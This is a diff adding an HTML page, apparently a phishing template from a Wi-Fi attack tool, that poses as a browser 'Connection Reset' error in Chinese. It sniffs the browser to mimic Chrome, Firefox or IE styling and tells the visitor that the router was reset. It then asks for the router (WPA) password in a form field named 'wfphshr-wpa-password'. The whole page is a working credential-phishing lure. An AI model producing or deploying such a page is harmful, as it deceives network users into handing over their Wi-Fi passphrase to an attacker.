@@ -1,0 +1,75 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
+    <head>
+        <title>Connection Reset</title>
+        
+        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+        <script type="text/javascript">
+            function toggleHelp() {
+                var h = document.getElementById('help');
+                if(h.style.display == 'block'){
+                    h.style.display = 'none';
+                }
+                else{
+                    h.style.display = 'block';
+                }
+            }
+            var is_chrome = navigator.userAgent.toLowerCase().indexOf('chrome') > -1;
+            var is_firefox = navigator.userAgent.toLowerCase().indexOf('firefox') > -1;
+            if (is_chrome){
+                document.write('<'+'link rel="stylesheet" type="text/css" href="chrome.css" />');
+                document.write('<'+'link rel="icon" type="image/x-icon" href="icon/chrome_fav.ico" />');
+            }
+            else if (is_firefox){
+                document.write('<'+'link rel="stylesheet" type="text/css" href="firefox.css" />')
+                document.write('<'+'link rel="icon" type="image/x-icon" href="icon/firefox_fav.ico" />');
+            }
+            else{
+                document.write('<'+'link rel="stylesheet" type="text/css" href="ie.css" />');
+                document.write('<'+'link rel="icon" type="image/x-icon" href="icon/ie_fav.ico" />');
+            }
+
+            
+        </script>
+    </head>
+    <body>
+        <div id="center">
+            <div id="center-left">
+            <script>
+                if (is_chrome)
+                    document.write('<'+'img src="icon/chrome.png"/>');
+                else if (is_firefox)
+                    document.write('<'+'img src="icon/firefox.png"/>');
+                else
+                    document.write('<'+'img src="icon/ie.png"/>');
+            </script>
+            </div>
+            <div id="center-right">
+                <div id="title">你的连接被重置了</div>
+                <br>
+                <div id="content">你的路由或者网关被重置了.
+                                  你必须通过浏览器重新验证你的连接.
+                </div>
+            </div>
+            
+            <div id="center-below">
+                <form action="index.html" method="post">
+                路由密码: &nbsp;&nbsp;<input type="password" name="wfphshr-wpa-password">
+                <input id="btnSubmit" type="submit" value="确认">
+            </form></div>
+            
+            <br>
+            <br>
+            <a id="helpbutton" onclick="toggleHelp()" href="#">这是什么?</a>
+            <div id="help" style="display: none;">
+                这意味着你的路由和你的连接意外的中断了. 导致这个的原因很多, 但它是非常
+                容易解决的通过重新验证你的连接。
+                
+                如果这个之前也有发生，请联系你的系统管理员或者服务提供商。
+                
+                <br><br>
+                <div id="error">网络连接错误(205)</div>
+            </div>
+        </div>
+    </body>
+</html>
